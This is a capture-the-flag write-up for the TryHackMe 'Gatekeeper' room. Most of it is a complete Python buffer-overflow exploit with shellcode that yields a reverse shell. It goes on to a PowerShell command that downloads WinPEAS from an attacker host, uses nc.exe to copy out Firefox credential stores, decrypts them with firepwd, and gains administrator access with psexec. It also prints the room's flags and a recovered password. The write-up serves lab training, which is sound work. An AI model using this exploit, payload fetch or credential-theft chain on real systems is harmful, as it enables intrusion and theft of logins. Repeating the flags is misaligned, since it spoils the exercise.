###### Can you get past the gate and through the fire?
Room: https://tryhackme.com/room/gatekeeper
##

We can find the app in the Users directory on the SMB server.  

The buffer overflow phase is the same as in [Brainstorm](https://github.com/leftermv/writeups/blob/main/THM/Brainstorm.md) room.  
So no point in covering every step again xD
Some useful info
* EIP offset is 146.
* Bad chars are x00 and x0a
* a jump can be found at 0x080414c3

**final exploit**
```
import socket

ip = "target IP"
port = 31337
prefix = "" 
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xba\x4c\xf9\xfc\xe3\xda\xc5\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x53\x12\x03\x53\x12\x83\x8f\xfd\x1e\x16\xf3\x16\x5c"
"\xd9\x0b\xe7\x01\x53\xee\xd6\x01\x07\x7b\x48\xb2\x43\x29\x65"
"\x39\x01\xd9\xfe\x4f\x8e\xee\xb7\xfa\xe8\xc1\x48\x56\xc8\x40"
"\xcb\xa5\x1d\xa2\xf2\x65\x50\xa3\x33\x9b\x99\xf1\xec\xd7\x0c"
"\xe5\x99\xa2\x8c\x8e\xd2\x23\x95\x73\xa2\x42\xb4\x22\xb8\x1c"
"\x16\xc5\x6d\x15\x1f\xdd\x72\x10\xe9\x56\x40\xee\xe8\xbe\x98"
"\x0f\x46\xff\x14\xe2\x96\x38\x92\x1d\xed\x30\xe0\xa0\xf6\x87"
"\x9a\x7e\x72\x13\x3c\xf4\x24\xff\xbc\xd9\xb3\x74\xb2\x96\xb0"
"\xd2\xd7\x29\x14\x69\xe3\xa2\x9b\xbd\x65\xf0\xbf\x19\x2d\xa2"
"\xde\x38\x8b\x05\xde\x5a\x74\xf9\x7a\x11\x99\xee\xf6\x78\xf6"
"\xc3\x3a\x82\x06\x4c\x4c\xf1\x34\xd3\xe6\x9d\x74\x9c\x20\x5a"
"\x7a\xb7\x95\xf4\x85\x38\xe6\xdd\x41\x6c\xb6\x75\x63\x0d\x5d"
"\x85\x8c\xd8\xf2\xd5\x22\xb3\xb2\x85\x82\x63\x5b\xcf\x0c\x5b"
"\x7b\xf0\xc6\xf4\x16\x0b\x81\xf0\xef\x17\xb8\x6d\xf2\x17\x3e"
"\x39\x7b\xf1\x54\xd5\x2d\xaa\xc0\x4c\x74\x20\x70\x90\xa2\x4d"
"\xb2\x1a\x41\xb2\x7d\xeb\x2c\xa0\xea\x1b\x7b\x9a\xbd\x24\x51"
"\xb2\x22\xb6\x3e\x42\x2c\xab\xe8\x15\x79\x1d\xe1\xf3\x97\x04"
"\x5b\xe1\x65\xd0\xa4\xa1\xb1\x21\x2a\x28\x37\x1d\x08\x3a\x81"
"\x9e\x14\x6e\x5d\xc9\xc2\xd8\x1b\xa3\xa4\xb2\xf5\x18\x6f\x52"
"\x83\x52\xb0\x24\x8c\xbe\x46\xc8\x3d\x17\x1f\xf7\xf2\xff\x97"
"\x80\xee\x9f\x58\x5b\xab\x80\xba\x49\xc6\x28\x63\x18\x6b\x35"
"\x94\xf7\xa8\x40\x17\xfd\x50\xb7\x07\x74\x54\xf3\x8f\x65\x24"
"\x6c\x7a\x89\x9b\x8d\xaf")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
except:
  print("boom :(")
```

After we get a reverse shell, we see that we're under user **natbat**. 
**The first flag is at C:\Users\natbat\Desktop\user.txt.txt and is {H4lf_W4y_Th3r3}** **[1]**.  


We can upload **WinPEAS** from our attacking machine using the following Powershell command.  
> powershell -c "Set-Content -value (New-Object Net.WebClient).DownloadData('http://xx.x.x.xxx:8000/WinPEAS.bat') -encoding byte -Path WinPeas.bat";

We can see that we're somehow hinted to check the saved firefox profiles.
I uploaded a static **nc.exe** on the target machine and used it to transfer two files.
* key4.db
* logins.json

Both files were in **C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\**.  
Using **firepwd** we're able to get a user and a password from browser's cache, mayor:8CL7O1N78MdrCIsV

**python3** /usr/share/doc/python3-impacket/examples/psexec.py mayor:8CL7O1N78MdrCIsV@targetIP to auth as mayor under Administrator privileges.  

**The second and final flag is at C:\Users\mayor\Desktop\root.txt.txt and is {Th3_M4y0r_C0ngr4tul4t3s_U}** **[2]**.  
